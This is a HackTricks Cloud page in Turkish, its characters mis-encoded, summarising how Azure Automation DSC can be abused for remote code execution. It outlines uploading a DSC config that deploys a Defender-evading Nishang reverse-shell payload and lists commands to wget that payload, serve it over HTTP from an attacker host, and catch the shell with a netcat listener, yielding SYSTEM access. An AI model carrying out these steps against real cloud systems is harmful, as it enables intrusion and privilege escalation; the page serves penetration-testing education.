# Az - Durum YapÄ±landÄ±rma Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na katkÄ±da bulunun.**

</details>
{% endhint %}

**Tam gÃ¶nderiyi kontrol edin: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Uzak Sunucu (C2) AltyapÄ± HazÄ±rlÄ±ÄŸÄ± ve AdÄ±mlarÄ±nÄ±n Ã–zeti

#### Genel BakÄ±ÅŸ
Bu sÃ¼reÃ§, Windows Defender'Ä± atlatmak iÃ§in tasarlanmÄ±ÅŸ `RevPS.ps1` adlÄ± deÄŸiÅŸtirilmiÅŸ bir Nishang `Invoke-PowerShellTcp.ps1` yÃ¼kÃ¼nÃ¼ barÄ±ndÄ±rmak iÃ§in uzaktan bir sunucu altyapÄ±sÄ± kurmayÄ± iÃ§erir. YÃ¼k, IP'si `40.84.7.74` olan bir Kali Linux makinesinden basit bir Python HTTP sunucusu kullanÄ±larak sunulmaktadÄ±r. Ä°ÅŸlem birkaÃ§ adÄ±mda gerÃ§ekleÅŸtirilir:

#### AdÄ±m 1 â€” Dosyalar OluÅŸturma
- **Gerekli Dosyalar:** Ä°ki PowerShell betiÄŸi gereklidir:
1. `reverse_shell_config.ps1`: YÃ¼kÃ¼ alÄ±p Ã§alÄ±ÅŸtÄ±ran bir Desired State Configuration (DSC) dosyasÄ±. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) adresinden temin edilebilir.
2. `push_reverse_shell_config.ps1`: YapÄ±landÄ±rmayÄ± sanal makineye yayÄ±nlamak iÃ§in bir betik, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) adresinde bulunmaktadÄ±r.
- **Ã–zelleÅŸtirme:** Bu dosyalardaki deÄŸiÅŸkenler ve parametreler, kaynak adlarÄ±, dosya yollarÄ± ve sunucu/yÃ¼k kimlikleri de dahil olmak Ã¼zere kullanÄ±cÄ±nÄ±n belirli ortamÄ±na uyarlanmalÄ±dÄ±r.

#### AdÄ±m 2 â€” YapÄ±landÄ±rma DosyasÄ±nÄ± SÄ±kÄ±ÅŸtÄ±rma
- `reverse_shell_config.ps1` bir `.zip` dosyasÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±larak Azure Depolama HesabÄ±na transfer iÃ§in hazÄ±r hale getirilir.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### AdÄ±m 3 â€” Depolama BaÄŸlamÄ±nÄ± AyarlayÄ±n ve YÃ¼kleyin
- SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ yapÄ±landÄ±rma dosyasÄ±, Azure'Ä±n Set-AzStorageBlobContent komut dosyasÄ±nÄ± kullanarak Ã¶nceden belirlenmiÅŸ bir Azure Depolama konteynerine, azure-pentest'e yÃ¼klenir.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### AdÄ±m 4 â€” Kali Kutusunu HazÄ±rlayÄ±n
- Kali sunucusu, RevPS.ps1 yÃ¼kÃ¼nÃ¼ bir GitHub deposundan indirir.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Betik, ters shell iÃ§in hedef Windows VM ve portu belirtmek Ã¼zere dÃ¼zenlenmiÅŸtir.

#### AdÄ±m 5 â€” YapÄ±landÄ±rma DosyasÄ±nÄ± YayÄ±mla
- YapÄ±landÄ±rma dosyasÄ± yÃ¼rÃ¼tÃ¼lÃ¼r ve ters shell betiÄŸi belirtilen konuma Windows VM Ã¼zerinde daÄŸÄ±tÄ±lÄ±r.

#### AdÄ±m 6 â€” YÃ¼kÃ¼ BarÄ±ndÄ±r ve Dinleyiciyi Kur
- Bir Python SimpleHTTPServer, yÃ¼kÃ¼ barÄ±ndÄ±rmak iÃ§in baÅŸlatÄ±lÄ±r, ayrÄ±ca gelen baÄŸlantÄ±larÄ± yakalamak iÃ§in bir Netcat dinleyici kurulur.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- ZamanlanmÄ±ÅŸ gÃ¶rev, payload'Ä± yÃ¼rÃ¼terek SÄ°STEM dÃ¼zeyinde ayrÄ±calÄ±klar elde eder.

#### SonuÃ§

Bu sÃ¼recin baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi, kimlik bilgilerinin sÄ±zdÄ±rÄ±lmasÄ± veya saldÄ±rÄ±nÄ±n birden fazla sanal makineye geniÅŸletilmesi gibi birÃ§ok olasÄ±lÄ±ÄŸÄ± beraberinde getirir. KÄ±lavuz, Azure Automation DSC alanÄ±nda devam eden Ã¶ÄŸrenmeyi ve yaratÄ±cÄ±lÄ±ÄŸÄ± teÅŸvik eder.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitimi AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitimi GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
